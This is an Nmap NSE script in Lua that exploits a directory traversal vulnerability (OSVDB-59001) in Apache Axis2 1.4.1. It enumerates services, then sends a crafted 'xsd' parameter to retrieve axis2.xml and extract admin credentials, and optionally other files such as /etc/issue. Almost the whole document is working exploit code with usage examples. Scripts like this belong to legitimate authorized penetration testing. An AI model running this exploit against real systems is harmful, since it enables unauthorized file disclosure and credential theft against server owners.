local creds = require "creds"
local http = require "http"
local io = require "io"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"

description = [[
Exploits a directory traversal vulnerability in Apache Axis2 version 1.4.1 by sending a specially crafted request to the parameter <code>xsd</code> (OSVDB-59001). By default it will try to retrieve the configuration file of the Axis2 service <code>'/conf/axis2.xml'</code> using the path <code>'/axis2/services/'</code> to return the username and password of the admin account.

To exploit this vulnerability we need to detect a valid service running on the installation so we extract it from <code>/listServices</code> before exploiting the directory traversal vulnerability.
By default it will retrieve the configuration file, if you wish to retrieve other files you need to set the argument <code>http-axis2-dir-traversal.file</code> correctly to traverse to the file's directory. Ex. <code>../../../../../../../../../etc/issue</code>

To check the version of an Apache Axis2 installation go to:
http://domain/axis2/services/Version/getVersion

Reference:
* http://osvdb.org/show/osvdb/59001
* http://www.exploit-db.com/exploits/12721/
]]

---
-- @usage
-- nmap -p80,8080 --script http-axis2-dir-traversal --script-args 'http-axis2-dir-traversal.file=../../../../../../../etc/issue' <host/ip>
-- nmap -p80 --script http-axis2-dir-traversal <host/ip>
--
-- @output
-- 80/tcp open  http    syn-ack
-- |_http-axis2-dir-traversal.nse: Admin credentials found -> admin:axis2
--
-- @args http-axis2-dir-traversal.file Remote file to retrieve
-- @args http-axis2-dir-traversal.outfile Output file
-- @args http-axis2-dir-traversal.basepath Basepath to the services page. Default: <code>/axis2/services/</code>
--
-- Other useful arguments for this script:
-- @args http.useragent User Agent used in the GET requests
---

author = "Paulino Calderon"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive", "exploit"}


portrule = shortport.http

--Default configuration values
local DEFAULT_FILE = "../conf/axis2.xml"
local DEFAULT_PATH = "/axis2/services/"

---
--Checks the given URI looks like an Apache Axis2 installation
-- @param host Host table
-- @param port Port table
-- @param path Apache Axis2 Basepath
-- @return True if the string "Available services" is found
local function check_installation(host, port, path)
  local req = http.get(host, port, path)
  if req.status == 200 and http.response_contains(req, "Available services") then
    return true
  end 
  return false
end

---
-- Returns a table with all the available services extracted
-- from the services list page
-- @param body Services list page body
-- @return Table containing the names and paths of the available services
local function get_available_services(body) 
 local services = {}
 for service in string.gmatch(body, '<h4>Service%sDescription%s:%s<font%scolor="black">(.-)</font></h4>') do
    table.insert(services, service)
  end

  return services 
end

---
--Writes string to file
--Taken from: hostmap.nse
-- @param filename Filename to write
-- @param contents Content of file
-- @return True if file was written successfully
local function write_file(filename, contents)
  local f, err = io.open(filename, "w")
  if not f then
    return f, err
  end
  f:write(contents)
  f:close()
  return true
end

---
-- Extracts Axis2's credentials from the configuration file
-- It also adds them to the credentials library.
-- @param body Configuration file string
-- @return true if credentials are found
-- @return Credentials or error string
---
local function extract_credentials(host, port, body)
  local _,_,user = string.find(body, '<parameter name="userName">(.-)</parameter>')
  local _,_,pass = string.find(body, '<parameter name="password">(.-)</parameter>')

  if user and pass then
    local cred_obj = creds.Credentials:new( SCRIPT_NAME, host, port )
    cred_obj:add(user, pass, creds.State.VALID )
    return true, string.format("Admin credentials found -> %s:%s", user, pass)
  end
  return false, "Credentials were not found."
end

action = function(host, port)
  local outfile = stdnse.get_script_args("http-axis2-dir-traversal.outfile") 
  local rfile = stdnse.get_script_args("http-axis2-dir-traversal.file") or DEFAULT_FILE
  local basepath = stdnse.get_script_args("http-axis2-dir-traversal.basepath") or DEFAULT_PATH
  local selected_service, output

  --check this is an axis2 installation  
  if not(check_installation(host, port, basepath.."listServices")) then
    stdnse.print_debug(1, "%s: This does not look like an Apache Axis2 installation.", SCRIPT_NAME)
    return
  end

  output = {}
  --process list of available services
  local req = http.get( host, port, basepath.."listServices")
  local services = get_available_services(req.body)

  --generate debug info for services and select first one to be used in the request
  if #services > 0 then
    for _, servname in pairs(services) do
      stdnse.print_debug(1, "%s: Service found: %s", SCRIPT_NAME, servname) 
    end 
    selected_service = services[1]
  else
    if nmap.verbosity() >= 2 then
      stdnse.print_debug(1, "%s: There are no services available. We can't exploit this", SCRIPT_NAME)
    end
    return 
  end

  --Use selected service and exploit
  stdnse.print_debug(1, "%s: Querying service: %s", SCRIPT_NAME, selected_service)  
  req = http.get(host, port, basepath..selected_service.."?xsd="..rfile)
  stdnse.print_debug(2, "%s: Query -> %s", SCRIPT_NAME, basepath..selected_service.."?xsd="..rfile)

  --response came back
  if req.status and req.status == 200 then
    --if body is empty something wrong could have happened...
    if string.len(req.body) <= 0 then
      if nmap.verbosity() >= 2 then
        stdnse.print_debug(1, "%s:Response was empty. The file does not exists or the web server does not have sufficient permissions", SCRIPT_NAME)
      end
      return
    end

    output[#output+1] = "\nApache Axis2 Directory Traversal (OSVDB-59001)"

    --Retrieve file or only show credentials if downloading the configuration file
    if rfile ~= DEFAULT_FILE then
      output[#output+1] = req.body
    else
      --try to extract credentials
      local extract_st, extract_msg = extract_credentials(host, port, req.body)
      if extract_st then
        output[#output+1] = extract_msg
      else
        stdnse.print_debug(1, "%s: Credentials not found in configuration file", SCRIPT_NAME)
      end
    end

    --save to file if selected
    if outfile then
      local status, err = write_file(outfile, req.body)
      if status then
        output[#output+1] = string.format("%s saved to %s\n", rfile, outfile)
      else
        output[#output+1] = string.format("Error saving %s to %s: %s\n", rfile, outfile, err)
      end
     end
  else
    stdnse.print_debug(1, "%s: Request did not return status 200. File might not be found or unreadable", SCRIPT_NAME)
    return
  end

  if #output > 0 then
    return stdnse.strjoin("\n", output)
  end
end
